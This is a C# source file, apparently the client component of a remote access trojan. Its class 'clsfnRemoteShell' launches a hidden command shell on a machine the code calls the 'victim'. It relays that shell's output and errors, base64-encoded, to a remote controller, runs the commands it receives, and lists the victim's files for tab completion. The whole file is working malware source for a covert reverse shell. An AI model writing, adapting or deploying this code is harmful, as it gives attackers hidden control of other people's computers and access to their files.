using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class clsfnRemoteShell
    {
        private clsVictim v;

        private TextBox cmd_textbox = new TextBox();
        private Process cmd_proc;

        private StreamReader sr_out;
        private StreamReader sr_err;
        private StreamWriter cmdSw_in;

        private bool cmd_sendPrompt = false;
        private bool bSendStdOutAndErr = true;
        private string exePath;
        private string initPath;

        private List<string> suggestion = new List<string>();
        private int idx_suggestion;
        private string last_pattern;

        private string cp; //CURRENT PATH

        private Keys[] SpecialKeys =
        {
            Keys.Tab,
            Keys.Enter,

            Keys.Back,
            Keys.Delete,

            Keys.Up,
            Keys.Left,
            Keys.Down,
            Keys.Right,
        };

        public clsfnRemoteShell(clsVictim v, string exePath, string initPath)
        {
            last_pattern = string.Empty;
            idx_suggestion = 0;
            cp = string.Empty;

            cmd_proc = null;
            this.exePath = exePath;
            this.initPath = initPath;

            this.v = v;
            Init(v);
        }

        private void Init(clsVictim v)
        {
            try
            {
                if (cmd_proc == null)
                {
                    cmd_proc = new Process();
                    cmd_proc.StartInfo = new ProcessStartInfo()
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true,
                        RedirectStandardInput = true,
                        FileName = exePath,
                        WorkingDirectory = initPath,
                    };

                    cmd_proc.Start();
                }

                sr_out = cmd_proc.StandardOutput;
                sr_err = cmd_proc.StandardError;
                cmdSw_in = cmd_proc.StandardInput;
                cmd_sendPrompt = false;
                bSendStdOutAndErr = true;

                //OUTPUT STREAM
                new Thread(() =>
                {
                    while (bSendStdOutAndErr)
                    {
                        string line = sr_out.ReadLine();
                        v.SendCommand("shell|output|" + clsCrypto.b64E2Str(Environment.NewLine + line));

                        if (cmd_sendPrompt)
                        {
                            cp = line.Replace(">", string.Empty).Replace(Environment.NewLine, string.Empty).Trim();
                            cmd_sendPrompt = false;
                        }
                    }
                }).Start();

                //ERROR STREAM
                new Thread(() =>
                {
                    while (bSendStdOutAndErr)
                    {
                        try
                        {
                            string line = sr_err.ReadLine();
                            v.SendCommand("shell|error|" + clsCrypto.b64E2Str(Environment.NewLine + line));

                            if (cmd_sendPrompt)
                            {
                                cp = line.Replace(">", string.Empty).Replace(Environment.NewLine, string.Empty).Trim();
                                cmd_sendPrompt = false;
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message);
                        }
                    }
                }).Start();

                Thread.Sleep(500);
                cmd_sendPrompt = true;
                cmdSw_in.WriteLine("");
                cmdSw_in.Flush();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public (int, string) StopCmd()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                bSendStdOutAndErr = false;
                cmdSw_in.Close();
                sr_out.Close();
                sr_err.Close();
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }

        public void SendCmd(string cmd)
        {
            if (string.IsNullOrEmpty(cmd.Replace(Environment.NewLine, string.Empty)))
            {
                cmd_sendPrompt = true;
            }

            cmdSw_in.WriteLine(cmd);
        }

        public void ProcessTab(string pattern)
        {
            try
            {
                string[] s = pattern.Split(' ');
                int len = s.Length;
                string last = len == 0 ? "" : s[len - 1];

                if (pattern != last_pattern || string.IsNullOrEmpty(pattern))
                {
                    idx_suggestion = 0;
                    foreach (string dir in Directory.GetDirectories(cp))
                        suggestion.Add(Path.GetFileName(dir));
                    foreach (string file in Directory.GetFiles(cp))
                        suggestion.Add(file);
                }

                List<string> ls = s.ToList();
                if (suggestion.Count == 0)
                    suggestion.Add(last);

                string sug = suggestion[idx_suggestion];
                ls.Add(sug);
                string line = string.Join(" ", ls.ToArray());
                v.SendCommand("shell|tab|" + clsCrypto.b64E2Str(line));
                idx_suggestion++;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public (int, string) SendCtrlKey(ShellCtrl ctrl)
        {
            int code = 0;
            string msg = string.Empty;

            try
            {
                if (ctrl == ShellCtrl.CtrlC)
                {
                    if (WinAPI.AttachConsole((uint)cmd_proc.Id))
                    {
                        WinAPI.GenerateConsoleCtrlEvent(0, 0);
                        Thread.Sleep(1000);
                        WinAPI.FreeConsole();
                    }
                }
                else if (ctrl == ShellCtrl.CtrlZ)
                {
                    cmdSw_in.WriteLine("\x1A");
                    cmdSw_in.WriteLine();
                }
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
    }
}
